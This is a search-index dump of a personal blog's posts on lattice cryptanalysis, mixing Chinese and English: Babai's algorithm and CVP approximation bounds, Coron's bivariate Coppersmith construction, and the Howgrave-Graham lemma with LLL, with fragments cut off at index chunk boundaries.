\\boldsymbol{x} = \\sum\\frac{\\langle\\widetilde{\\boldsymbol{b_{i}}},\\boldsymbol{x}\\rangle}{\\Vert\\widetilde{\\boldsymbol{b_{i}}}\\Vert^{2}}\\cdot\\widetilde{\\boldsymbol{b_{i}}} $$ Babai 中的系数形式为 $$ \\langle\\widetilde{\\boldsymbol{b_{n-i+1}}},\\boldsymbol{s}\\rangle / \\Vert \\widetilde{\\boldsymbol{b_{n-i+1}}}\\Vert ^{2} $$ 大约在 $1/2$ 的数量级（上界），故而通过简单的不等式放缩可以证明 PROOF: Vector Decomposition Using Gram-Schmidt Vectors: Any vector $t\\in\\operatorname{span}(B)$ can be decomposed in terms of the Gram-Schmidt orthogonal basis ${\\tilde{b}_i}:$ $$ t=\\sum_{i=1}^n\\alpha_i\\tilde{b}_i $$ where $\\alpha_i=0$ Approximation Quality Since the algorithm rounds each coefficient $\\alpha_i$ to the nearest integer, the difference between $x$ and $t$ can be bounded. Specifically, for each $i$: $$ |\\alpha_i-\\text{round}(\\alpha_i)|\\leq\\frac12. $$ Therefore, the distance between $x$ and $t$ can be expressed as a sum of these small deviations over all Gram-Schmidt vectors: $$ x=\\sum_{i=1}^n\\mathrm{round}(\\alpha_i)\\tilde{b}_i. $$ Bounding the Distance: The distance $\\Vert x-t \\Vert$ is thus related to the error in each dimension: $$ x-t=\\sum_{i=1}^n(\\text{round}(\\alpha_i)-\\alpha_i)\\tilde{b}_i $$ Since |round$(\\alpha_{i})-\\alpha_{i}|\\leq\\frac12$,we have: $$ \\Vert x-t\\Vert \\leq\\sum_{i=1}^n |\\text{round}(\\alpha_i)-\\alpha_i| \\Vert\\tilde{b_i}\\Vert \\leq\\frac{1}{2}\\sum_{i=1}^{n} \\Vert \\tilde{b_i}\\Vert. $$ Squared Distance Bound: The squared distance is then: $$ \\Vert s \\Vert^2 = \\Vert x-t\\Vert^2 \\leq \\left(\\frac{1}{2}\\sum_{i=1}^{n} \\Vert \\tilde{b_i} \\Vert \\right)^2 \\leq \\frac{1}{4}\\sum_{i=1}^{n}\\Vert \\tilde{b_i}\\Vert^2. $$ The last inequality follows from the Cauchy-Schwarz inequality, which ensures that the sum of squares of the individual terms is an upper bound on the square of their sum. In fact, ","date":"2024-06-14","objectID":"/lattice-part-2/:4:1","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Property 2 The output vector is determinated by the coset. PROOF: Babai’s behaviour Babai’s algorithm divides space into hyper-rectanges according to GS vectors. The output of Babai’s algorithm depends only on where the input lands modulo this tiling 这实际上说明了 Babai 在一定范围内一定会得到想要结果，而值得深入研究的是这里的 $\\gamma$-CVP 中的 $\\gamma$ 是否可以找到一个上界，或这样的上界是否能够继续优化。 在这样的模型思考下，我们形式上可以给出一个基础的 Bound : $$ \\gamma\\leq\\frac{\\left(\\sum\\Vert\\widetilde{\\boldsymbol{b_{i}}}\\Vert^{2}\\right)^{1/2}}{\\min\\Vert\\widetilde{\\boldsymbol{b_{i}}}\\Vert} $$ 而这个 Bound 还有优化空间： ","date":"2024-06-14","objectID":"/lattice-part-2/:4:2","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Property 3 PROOF: 注意到： 即使在$\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})\u003e|\\widetilde{\\boldsymbol{b}}_i|/2$的情况下，Babai 算法仍可能正确地选择某些坐标。 当 $\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})\u003c|\\widetilde{\\boldsymbol{b}}_n|/2$ 时，显然最近的向量在最近的格子超平面上，因为其他超平面上的向量距离 $t$ 至少 $\\Vert\\widetilde{\\boldsymbol{b}}_n\\Vert /2$, 大于$\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})$。 所以 Babai 算法会选择正确的第 $n$ 个坐标。 更一般地，如果对于某个 $i$ , $\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})\u003c\\Vert\\widetilde{\\boldsymbol{b}}_j\\Vert/2$ 对所有 $j\\geq i$ 成立，那么 Babai 算法将正确选择所有 $j\\geq i$ 的坐标，并且输出向量满足： $$ |\\boldsymbol{s}|^2\\leq\\frac12\\sum_{j=1}^i\\Vert\\widetilde{\\boldsymbol{b}}_j\\Vert^2+\\operatorname{dist}(\\boldsymbol{t},\\mathsf{L})^2 $$ 如果 $\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})\u003c\\Vert\\widetilde{\\boldsymbol{b}}_i\\Vert/2$ 对所有 $i$ 成立，那么我们知道输出是正确的，因此可以假设存在某个 $i\\in {1,\\ldots,n}$ 使得$\\ \\operatorname{dist}( \\boldsymbol{t}, \\mathcal{L} ) \\geq \\Vert \\widetilde{\\boldsymbol{b}} _i\\Vert / 2$ , 并且可以取 $i$ 为满足此性质的最大值。 故而： $$ \\Vert\\boldsymbol{s}\\Vert^2\\leq\\frac{1}{2}\\sum_{j=1}^{i}\\Vert\\widetilde{\\boldsymbol{b_j}}\\Vert^2+\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})^2\\leq\\frac{\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})^2}{\\Vert\\widetilde{\\boldsymbol{b_i}}\\Vert^2}\\cdot\\sum_{j=1}^{i}\\Vert\\widetilde{\\boldsymbol{b_j}}\\Vert^{2}+\\operatorname{dist}(\\boldsymbol{t},\\mathcal{L})^2 $$ 我们来看这一推导的具体细节： PROOF ","date":"2024-06-14","objectID":"/lattice-part-2/:4:3","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Corollary 由 LLL 约简基的性质不难证明 Just like in the SVP case, slightly better approximation factors are known using BKZ bases (which generalize LLL bases). In particular, for any constant $C\u003e0$, there is an efficient algorithm that solves $2^{Cn\\log\\log n / \\log n}$-CVP ","date":"2024-06-14","objectID":"/lattice-part-2/:4:4","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"References Lattice in Cryptoanalysis Babai’s Algorithm CVP ","date":"2024-06-14","objectID":"/lattice-part-2/:5:0","tags":[],"title":"Lattice Part 2","uri":"/lattice-part-2/"},{"categories":[],"content":"Solving Small root for Modular Bivariate Polynomial Coron’s Technique ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:0:0","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Howgave-Graham’s condition For proof, just recall the inequality we metioned last blog. There is a grace way to proof this. ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:1:0","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"PROOF: According to lemma 3, we have: $$ \\begin{aligned}\\vert h(x_0,y_0)\\vert \u0026= \\vert \\sum h_{i,j} x_0^i y_0^j \\vert = \\vert \\sum h_{i,j} X^jY^j(x_0/X)^i(y_0/Y)^j \\vert \\\\ \u0026\\le \\sum \\vert h_{i,j}X^jY^j(x_0/X)^i(y_0/Y)^j \\vert \\\\ \u0026\\le \\sum \\vert h_{i,j} X^iY^j \\vert \\\\ \u0026\\le \\sqrt{\\omega}\\Vert h(xX,yY) \\Vert \\lt n \\end{aligned} $$ then given $h(x_0,y_0) \\equiv 0 \\mod n$, we have $h(x_0,y_0) = 0$. The lemma there also descripted as follow: ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:1:1","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Bivariate Integer Polynomials Case After we process the univariate case in last post, now with the similar method , we can also find small root on bivariate polynomial ring under Howgrave’s condition. In the bivariate integer polynomial case, we can utilize a similar approach to the univariate scenario that was covered previously. The key is to leverage Howgrave’s condition to construct a matrix whose linear space forms a lattice. By applying the LLL algorithm to this lattice, we can then obtain a set of polynomials with smaller coefficients that share the same roots. Nevertheless, the bivariate case presents an additional challenge - we need to find two distinct polynomials in order to solve for both variables, $x$ and $y$. The general strategy is as follows: Construct a matrix whose rows correspond to the desired polynomial constraints, taking into account Howgrave’s condition. Apply the LLL algorithm to this matrix to obtain a reduced basis, which will include two or more polynomials with smaller coefficients. Analyze the resulting polynomials to identify a pair that can be used to solve for the values of x and y. This approach allows us to find the small roots of bivariate integer polynomials, under Howgrave’s condition. The most significant problem is the structure of our matrix. For example ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:2:0","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Coron’s Construction With familiar idea, we gonna set a lattice with a suitable determinant for lattice reduction , this process also reduce our coefficients. ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:3:0","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Build shift polynomials for our matrix. Set our target with the form below: $$ p(x,y) = \\sum_{0 \\le i, j \\le \\delta} p_{i,j} x^i y^j $$ Obviously, we note the coefficients as $p_{i,j}$. Remember that our goal is to reduce the coefficients to smaller ones in two independent polynomials letting us to find roots directly with resultant or Gröbner basis. With condition given in Howgrave-Graham, we start to build some polynomials. That is: We are looking for an integer root $(x_0,y_0)$ such that $p(x_0,y_0) = 0$ and with the bound $\\vert x_0 \\vert \\le X, \\vert y_0 \\vert \\le Y$. Assumption 1: $p(x,y)$ is irreducible. Of course, if not , just use the factor as new $p(x,y)$. Fact: shift ploynomials share the same root with our target $F(x,y)$ It’s trivial to attention the fact. In Cor[07] we build. $$ S_{a,b}(x,y) = x^a y^b \\cdot p(x,y) ,\\text{for}\\quad 0 \\le a,b \\lt k \\tag1 $$ $$ r_{i,j}(x,y) = x^i y^j \\cdot n ,\\text{for}\\quad 0 \\le i,b \\lt k+\\delta \\tag2 $$ Matrix $S$ Let $S$ be the matrix of row vectors obtained by taking the coefficients of the polynomials $S_{a,b}(x,y)$ for $0 \\le a, b \\lt k$, (choose $k \\in \\mathbb{N}$ sufficiently large) and consider the $k^2$ polynomials for which we only consider the monomials $x^{i_0 +i}y^{j_0 +j} \\text{for}\\quad 0 \\le i,j \\lt k$, where the index $(i_0,j_0)$ is given. ( $0 \\le i_0,j_0 \\lt \\delta $). For parameter $n$ in $(1),(2)$: $$ n \\coloneqq \\vert \\det S \\vert $$ Then, let $$ W = \\max_{i,j} \\vert p_{i,j} \\vert X^j Y^j = \\vert p_{uv} \\vert X^u Y^v $$ Proof of this inequality is pretty complex , before that we need to know the purpose of introducing Lemma 2: We are still on the road to find our shift polynomial Assumption 2: $$ XY \\lt W^{2/(3\\delta) -1/k}2^{-9k} $$ This gives $$ \\begin{aligned} W \u0026\\gt (XY)^{\\delta}\\cdot2^{9\\delta^{2}} \\\\ n \u0026= O(W^{k^2}) \\end{aligned} $$ so that matrix $S$ is invertible. Finally, we can descript our shift polynomial $h(x,y)$ . Let $h(x,y)$ be a linear combination of the polynomials $s_{a,b}(x,y)$ and $r_{i,j}(x,y).$ Since we have that $s_{a,b}(x,y)=0$ mod $n$ for all $a,b$ and $r_{i,j}(x,y)=0 \\mod n$ for all $i,j$,we obtain: $$ h(x_0,y_0)=0 \\mod n. $$ The following lemma, due to Howgrave-Graham [13], shows that if the coefficients of polynomial $h(x,y)$ are sufficiently small, then $h(x_0,y_0)=0$ holds over the integers. For a polynomial $h(x,y)=\\sum_{i,j} h_{ij}x^{i} y^{j}$, we define $\\Vert h(x,y) \\Vert ^2:=\\sum_{i,j}\\vert h_{ij}\\vert^2.$ Lattice $L$ We consider the lattice $L$ generated by the row vectors formed with the coefficients of polynomials $s_{a,b}(xX,yY)$ and $r_{i,j}(xX,yY).$ In total, there are $k^2+(k+\\delta)^2$ such polynomials; moreover these polynomials are of maximum degree $\\delta+k-1$ in $x,y$, so they contain at most $(\\delta + k)^2$ coefficients. Let $M$ be the corresponding matrix of row vectors; $M$ is therefore a rectangular matrix with $k^2+(k+\\delta)^2$ rows and $(k+\\delta)^2$ columns (see Figure 2 for an illustration). Observe that the rows of $M$ do not form a basis of $L$ (because there are more rows than columns), but $L$ is a full rank lattice of dimension $(k+\\delta)^2$ (because the row vectors corresponding to polynomials $r_{i,j}(xX,yY)$ form a full rank lattice). With our idea to find $h(x,y)$, we build $M$. Notice that choosing a block in $M$ can done the task easier. Nonetheless, that’s not enough. Sublattice $L_2$ Formally, we choose the sub lattice $L_2$ with $\\omega$ dimensions $$ \\omega \\coloneqq (\\delta+K)^2 -k^2 = \\delta^2 + 2k\\delta $$ A matrix basis for $L_2$ can be obtained by fırst triangularizing $M$ using elementary row operations and then taking the corresponding submatrix (see Figure 3). Now, the exciting moment. Apply LLL to $L_2$! Get a non-zero polynomial $h(x,y)$ that satisfies $h(x_0,y_0) = 0 \\mod n$ and $$ \\Vert h(xX,yY)\\Vert \\leq2^{(\\omega-1)/4}\\cdot\\det(L_2)^{1/\\omega} $$ From H-G bound: if : $$ 2^{(\\omega-1)/4} \\cdot \\det L_2 ^{1/\\omega} \\le \\frac{n}{\\sqrt\\omega} $$ then $h(x_0,y_0) = 0$ holds i","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:3:1","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Compute $\\det L_2$ Mainly algebra, nothing special. Calculating determinant with elementary rows transformation need some bridge matrix for block matrix computation. With our choosing strategy considered, there is a simplified matrix. Let $M^{\\prime}$ be the same matrix as $M$, except that we take the coefficients of polynomials $S_{a,b}(xX,yY)$ and $r_{i,j}(xX,yY)$; matrix $M^{\\prime}$ has $k^2+ (\\delta + k)^2$ rows and $(k+\\delta)^2$ columns. And we remove the $X^i Y^j$ powers. $$ M^{\\prime} = \\begin{bmatrix} S \u0026 T \\\\ nI_{k^2} \u0026 0 \\\\ 0 \u0026 nI_{\\omega} \\end{bmatrix} $$ Detail: Matrix $S$ is previously defined square matrix of dimension $k^2$, while $T$ is matrix with $k^2$ rows and $\\omega = k^2 + 2k\\delta$ columns. Let $L^\\prime$ be a lattice generated by the rows of $M^{\\prime}$, in other word , we set $L^{\\prime}$ in the row space of the matrix $M^{\\prime}$, and let $L_2^\\prime$ be the sublattice where all coefficients corresponding to monomials $x^{i+i_0}y^{j+j_0}$ for $0 \\le i, j\\lt k$ are set to zero. Note that lattice $L^{\\prime}$ corresponds to lattice $L$ without the $X^iY^j$ powers, whereas lattice $L_2^\\prime$ corresponds to lattice $L_2$. Note that: $$ S^\\prime \\cdot S = n I_{k^2} $$ Namely $S^\\prime$ is (up to sign) the transpose of the co-factor matrix of $S$, verifying $S^\\prime\\cdot S=(\\det S)I_{k^2}.$ of $M^{\\prime}$; this gives the following matrix: $$ M_2'=\\begin{bmatrix}I_{k^2}\u00260\u00260\\\\-S'\u0026I_{k^2}\u00260\\\\0\u00260\u0026I_\\omega\\end{bmatrix}\\cdot M'=\\begin{bmatrix}S\u0026T\\\\0\u0026T'\\\\0\u0026nI_\\omega\\end{bmatrix} $$ where $T^\\prime=-S^{\\prime}\\cdot T$ is a matrix with $k^2$ rows and $\\omega$ columns. By elementary operations on the rows of $M_2^{\\prime}$, we obtain: $$ M_3^{\\prime}=U\\cdot M_2^{\\prime}=\\begin{bmatrix}S\u0026T\\\\0\u0026T^{\\prime \\prime}\\\\0 \u0026 0\\end{bmatrix} $$ where $T^{\\prime\\prime}$ is a square matrix of dimension $\\omega$. We obtain that $T^{\\prime\\prime}$ is a row matrix basis of lattice $$ \\begin{aligned} \\det L^{\\prime}\u0026=\\vert \\det\\begin{bmatrix}S\u0026T\\\\0\u0026T''\\end{bmatrix}\\vert \\\\\u0026=\\vert \\det S\\vert \\cdot\\vert \\det T^{\\prime\\prime}\\vert \\\\ \u0026=\\vert \\det S\\vert \\cdot\\det L_2^{\\prime}\\\\ \u0026=n\\cdot\\det L_2^{\\prime}\\end{aligned} \\tag4 $$ So our target changes to compute the determinant of $L^{\\prime}$. The polynomial $p(x,y)$ being irreducible, the gcd of its coefficients is equal to $1$. The gcd of the coefficients of $p(x,y)$ being 1 implies that the entries of $M^{\\prime}$ are coprime, which allows for the columns of $M^{\\prime}$ to be transformed through elementary operations into an identity matrix block. This is possible because there are no common factors that restrict the linear combinations needed to zero out entries and simplify the matrix. The unimodular transformation preserves the determinant, ensuring that the fundamental properties of the lattice defined by $M^{\\prime}$ are maintained. $$ M_4^\\prime=M^\\prime\\cdot V=\\begin{bmatrix}I_{k^2}| 0\\\\nV\\end{bmatrix} $$ By elementary row operations on $M_4^{\\prime}$ based on $V^-1$ we obtain : $$ M_5^{\\prime}=\\begin{bmatrix}I_{k^2}\u00260\\\\0\u0026V^{-1}\\end{bmatrix}\\cdot M_4'=\\begin{bmatrix}I_{k^2}\u00260\\\\\u0026nI_{(\\delta+k)^2}\\end{bmatrix}=\\begin{bmatrix}I_{k^2}\u00260\\\\ nI_{k^2}\u00260\\\\0\u0026nI_\\omega\\end{bmatrix} $$ $$ M_6^{\\prime}= U^\\prime \\cdot M_5^{\\prime}=\\begin{bmatrix}I_{k^2}\u00260 \\\\ 0 \u0026 n I_\\omega \\\\ 0\u00260\\end{bmatrix} $$ $$ \\det L'=\\det\\begin{bmatrix}I_{k^2}\u00260 \\\\ 0\u0026nI_\\omega\\end{bmatrix}=n^\\omega \\tag5 $$ Combining equations $(4)$ and $(5)$, we obtain: $$ \\det L_2'=n^{\\omega-1} $$ Finally we can recover $\\det L_2$ from $\\det L_2^\\prime$: $$ \\begin{align} \\det L_2\u0026=\\det L_2^{\\prime}\\cdot\\frac{\\prod\\limits_{0\\leq i,j\u003c\\delta+k}X^iY^j}{\\prod\\limits_{0\\leq i,j\u003ck}X^{i_0+i}Y^{j_0+j}} \\\\ \u0026=n^{\\omega-1}\\cdot\\frac{(XY)^{(\\delta+k-1)\\cdot(\\delta+k)^2/2-(k-1)\\cdot k^2/2}}{(X^{i_0}Y^{j_0})^{k^2}}. \\end{align} $$ Remember that calculating the determinant is for our inequality relationship. $$ 2^{(\\omega-1)/4}\\cdot\\det(L_2)^{1/\\omega}\\leq\\frac{n}{\\sqrt{\\omega}} $$ This obtained: $$ 2^{\\omega\\cdot(\\omega-1)/4}\\cdot\\frac{(XY)^{","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:3:2","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Summary As usual we consider shifts of the polynomial $F(x, y)$. Choose $k\\in\\mathbb{N}$ (sufficiently large) and consider the $k^{2}$ polynomials. $$ s_{a,b}(x,y)=x^a y^b F(x,y)\\quad\\mathrm{for}\\quad 0\\leq a,b\u003ck $$ in the $(d+k)^2$ monomials $x^iy^j$ with $0\\leq i,j\u003cd+k.$ Coron chooses a certain set of $k^2$ monomials (specifically of the form $x^{i_0+i}y^{j_0+j}$ for $0\\leq i,j\u003ck$ and fixed $0\\leq i_0,j_0\\leq d)$ and obtains a $k^2\\times k^2$ matrix $S$ with non-zero determinant $M$. (The most technical part is proving that this can always be done and bounding the size of $M$.) One can now consider the $(d+k)^2$ polynomials $Mx^iy^j$ for $0\\leq i,j\u003cd+k.$ Writing each polynomial as a row vector of coefficients, we now have a $k^2+(d+k)^2$ by $(d+k)^2$ matrix. One can order the rows such that the matrix is of the form $$ \\begin{pmatrix}S \u0026 * \\\\ MI_{k^2}\u00260 \\\\ 0\u0026MI_w\\end{pmatrix} $$ where $w=(d+k)^2-k^2,*$ represents a $k^2\\times w$ matrix, and $I_w$ denotes the $w\\times w$ identity matrix. Now, since $M=\\det(S)$ there exists an integer matrix $S^\\prime$ such that $S^\\prime S=MI_{k^2}.$ Perform the row operations $$ \\begin{pmatrix}I_{k^2}\u00260\u00260 \\\\-S'\u0026I_{k^2}\u00260 \\\\ 0\u00260\u0026I_w\\end{pmatrix}\\begin{pmatrix}S\u0026* \\\\ M I_{k^2}\u00260 \\\\ 0\u0026MI_w\\end{pmatrix}=\\begin{pmatrix}S\u0026* \\\\ 0\u0026T \\\\ 0\u0026MI_w\\end{pmatrix} $$ for some $k^2\\times w$ matrix $T.$ Further row operations yield a matrix of the form $$ \\begin{pmatrix}S\u0026* \\\\ 0\u0026T' \\\\0\u00260\\end{pmatrix} $$ for some $w\\times w$ integer matrix $T^\\prime.$ Coron considers a lattice $L$ corresponding to $T^\\prime$ (where the entries in a column corresponding to monomial $x^iy^j$ are multiplied by $X^iY^j$ as in equation (19.2)) and computes the determinant of this lattice. Lattice basis reduction yields a short vector that corresponds to a polynomial $G(x,y)$ with small coefficients such that every root of $F(x,y)$ is a root of $G(x,y)$ modulo $M.$ If $(x_0,y_0)$ is a sufficiently small solution to $F(x,y)$ then, one infers that $G(x_0,y_0)=0$ over $\\mathbb{Z}.$ $G(x,y)$ has no common factor with $F(x,y)$. PROOF: Assume that $F(x,y)$ is irreducible, then $G(x,y) = \\sum_{0 \\le i, j\\lt k}A_{i,j}x^i y^j$ and so the vector of coeffiencients of $G(x,y)$ is a linear combination of the coefficient vectors of the $k^2$ polynomials $s_a,b(x,y)$ for $0\\leq a,b\u003ck.$ But this vector is also a linear combination of the rows of the matrix $\\begin{pmatrix} 0 \u0026T^{\\prime}\\end{pmatrix}$ in the original lattice. Considering the first $k^2$ columns (namely the c olumns of $S)$, one has a linear dependence of the rows in $S.$ Since $\\det(S)\\neq0$ this is a contradiction. With the main idea above, we can set the two theorem: ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:3:3","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Appendix See in references for an example. The proof of lemma 2 can be found in the appendix of Cor[07]. ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:4:0","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"References Course PPT Multivariate Coppersmtih-19.2 Introduction How to Represent Bivariate Polynomial Ring Polynomial and an ideal https://github.com/ubuntor/coppersmith-algorithm.git Coron jochemsz-may ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:5:0","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"RE:从零开始的crypto生活 模多项式求根问题 被认为计算困难的方程: $$ p(x)=0\\left(\\operatorname{mod}N\\right); $$ 在Zmod(N)的环下求解整数根。 $$ p(x,y)=0 \\pmod{N} $$ 对于多变量多项式在Zmod(N)的环下求解一组整数根。 Coppersmith’s Method ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:0:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"概述 针对这样的思路，可以在格规约、移位多项式和求解common root等几个过程做优化，从而达到提升bound、加快规约速度等目的。Sagemath 中集成了这一方式，但我们也可以手动修改其中过程，以满足需要。 一般的Howgrave-Graham给出: 即，当给定一个上界 $X = N$ ,如果一个根 $x_0 \\lt X$ ，那么我们当该多项式在整数环上时，$f(x_0)=0$ 依然成立。 这一引理通常被记为 Howgrave-Graham[22], 或 Hastad[19] 涉及范数证明的命题，时常会让我们想起柯西不等式，进而导出$l_1$范数和$l_2$范数间的关系。 为了更好理解，证明命题的功课时常不能忽略。 ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:1:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"$l_1$ 和 $l_2$ 范数之间的关系 (编写公式，为了方便没有切换输入法) Norm Relationships and Cauchy-Schwarz Inequality For a vector $a=(a_1,\\dots,a_n)$,then $l_1$-norm and the $l_2$-norm are defined as: $$\\Vert \\mathbf{a}\\Vert_1 =\\sum_{i=1}^{i} |a_i| \\quad\\mathrm{and}\\quad \\Vert\\mathbf{a}\\Vert_2=\\left(\\sum_{i=1}^{n}|a_{i}|^2\\right)^{1/2}.$$ The $l_1$-norm is generally larger than the $l_2$-norm, and they are related by: $$|\\mathbf{a}|_1\\leq\\sqrt{n}|\\mathbf{a}|_2.$$ This relationship can be derived from the Cauchy-Schwarz inequality. Cauchy-Schwarz Inequality: The Cauchy-Schwarz inequality states that for any vectors a and b in $\\mathbb{R}^n:$ $$ \\left(\\sum_{i=1}^na_ib_i\\right)^2\\leq\\left(\\sum_{i=1}^na_i^2\\right)\\left(\\sum_{i=1}^nb_i^2\\right). $$ If we take b to be a vector of ones, $\\mathbf{b}=(1,1,\\ldots,1)$,we get: $$ \\left(\\sum_{i=1}^na_i\\right)^2\\leq n\\left(\\sum_{i=1}^na_i^2\\right). $$ Taking the square root of both sides gives us the desired relationship: $$ \\sum_{i=1}^n|a_i|\\leq\\sqrt{n}\\left(\\sum_{i=1}^n|a_i|^2\\right)^{1/2}. $$ Applying This to the Problem In the howgrave’s case,we are dealing with a polynomial $g(x)=\\sum c_ix^i.$ The key steps in the inequality chain are: Bounding the Polynomial’s Value: $$ |g(x_0)|=\\left|\\sum_ic_ix_0^i\\right|\\leq\\sum_i|c_ix_0^i|. $$ Introducing a Bound on $x_0$: $$ \\sum_i|c_ix_0^i|\\leq\\sum_i|c_i|X^i $$ where $x_0 \\le X$. $$ \\sum_i|c_i|X^i = \\sum_i|c_iX^i| \\le\\sqrt{n} \\left(\\sum_i |c_i X^i| \\right )^{1/2}= \\sqrt{n} | g(xX)| \\lt N^m $$ Here,$g(xX)=\\sum c_i (xX)^i$. ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:2:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"与 Lattice 的关系 在前面我们完成了两个条件的初步解释： Property 2 表明 $$ |g(x_0)| \\lt N^m $$ 结合 Property 1 , 不难得出 $g(x_0)=0$ 的结论。 在此基础上，选定整数 $m \\in \\mathbb{Z}$ ,可以注意到存在这样的线性组合： $$ h_{i,j}=x^jN^if^{m-i}(x). $$ 所得的 $h_{i,j}$ 均满足 $h_{i,j}(x_0)=0 \\mod N^m$. Lattice 出现: 用系数向量 $h_i$ 唯一标识 $h_{i,j}(x)$ 。 Regev 讲义的 intro 部分在定义 lattice 时，将其写为一种线性组合： 而在此处，$h_{i,j}$ 的线性组合也可构成 Lattice. $$\\mathcal{L} (h_{0},\\dots,h_i) = \\set{\\sum x_i h_i\\mid x\\in\\mathbb{Z}}$$ 更为重要的是，在注意到我们定义的格$\\mathcal{L}$中，短向量与系数均相对较小的多项式 $g(x)$ 一一对应，那么考虑到 Howgrave-Graham[22] 的形式，从直觉上可以考虑在短向量上应用这一引理，从而得到一个满足条件的小根 $x_0$： $$ g(x_0)=0\\mathrm{~mod~}N^m\\mathrm{~and~}|g(x_0)|\u003cN^m,\\text{for }x \\lt X. \\tag{1} $$ 在满足这一条件时，直接当做普通多项式处理求根即可。 再进一步，由于我们在构造 Lattice $\\mathcal{L}$ 时, 给出先决条件, 所有的多项式 $h_{i,j}$ 共有一个根 $x_0$ .实际上，至此，我们完成了在 $(1)$ 的条件下的模多项式求根问题的一种求解方式。 实际上这依然是从根与多项式关系出发，化归到特定条件下的 SVP ，接下来我们处理 SVP 。 LLL 算法 回顾闵可夫斯基界下，任意 Lattice 均含有一个非零短向量$v' \\le \\sqrt{n}\\det(L)^{1/n}$. 对比两个不等式 $$ \\begin{align} |\\mathbf{v}| \u0026\\leq2^{\\frac{n-1}4}\\det(\\mathcal{L})^{\\frac1n} \\\\ |v' | \u0026\\le \\sqrt{n}\\det(\\mathcal{L})^{\\frac1n} \\end{align} $$ 在此前定义的格 $\\mathcal{L}$ 中，我们稍作分析 $$ \\det (\\mathcal{L})=N^{\\Theta(m)},m \\approx \\log N. $$ 所以当两不等式右侧的 $\\det(\\mathcal{L})$ 足够大时，可以把 LLL 所得 output $v$ 视作可用的一个短向量。 可以看到误差在 Coppersmith 的语境下是可以接受的范围，而且天然的赋予了所得近似短向量 $v$ 一个上界限，进而我们考虑 H-G[22] $$ \\det(\\mathcal{L})\u003c\\frac{N^{mn}}{n^{n/2}\\cdot2^{\\frac{(n-1)n}4}}\\lt N^{mn} $$ ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:3:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"Enabling Condition $$ \\det(\\mathcal{L}) \\le N^{mn} $$ 这一条件可用于优化$X$.接下来要详细的考虑如何构建这个Lattice $\\mathcal{L}$ Speaking Mathematically 首先关注如何构造 $h_{i,j}(x)$ : 选取 $m \\approx \\frac{\\log N}{\\delta} $ $$ h_{i,j}(x)=x^jN^if(x)^{m-i}\\mathrm{~for~}0\\leq i\u003cm,0\\leq j\u003c\\delta. $$ 形成了一张 $n = m\\delta \\approx \\log N$ 维 Lattice. $$ \\begin{cases} \\det(L)\u0026=\\det(B)\\approx N^{\\frac{\\delta m^2}2}X^{\\frac{n^2}2} \\\\ n \u0026= m\\delta \\\\ N^{\\frac{\\delta m^2}2}X^{\\frac{n^2}2} \u0026\\leq N^{mn}. \\end{cases} $$ 可得 $$ X \\le N^{1/\\delta} $$ 分析到这里，我们已经初步得到可行的方案, 但尚未引入 $\\beta$ 来优化 $X$ 的 bound. 算法的时间复杂度分析，本文略去。 上述做法的 Code 体现: delta = f.degree() g = [x**j * N**(m-i) * f**i for i in srange(m) for j in srange(delta)] For $\\beta,c,\\epsilon$ 我们在 sagemath 常用的 smal_root 方法, 通常有 $X,\\beta,\\epsilon$ 三个参数，和我们上面讨论的并不一致，本节继续探索这个问题。 ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:4:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"$c$ $c$ 的引入是为了提高 $X$ 的上界。 这里直接考虑对 $N$ 处理 对于区间 $[-cN^{1/\\delta},cN^{1/\\delta}]$ ,直接考虑分为 $c$ 个大小为 $2N^{1/\\delta}$ 